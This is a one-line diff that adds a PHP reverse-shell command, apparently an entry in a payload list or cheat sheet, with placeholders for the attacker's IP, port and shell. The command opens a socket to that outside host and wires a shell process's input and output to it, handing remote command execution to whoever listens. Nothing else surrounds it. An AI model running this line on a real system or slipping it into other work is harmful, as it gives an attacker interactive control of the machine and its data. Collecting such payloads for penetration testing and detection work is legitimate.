@@ -1,0 +1,1 @@
+php -r '$sock=fsockopen("IP",PORT);$proc=proc_open("SHELL", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
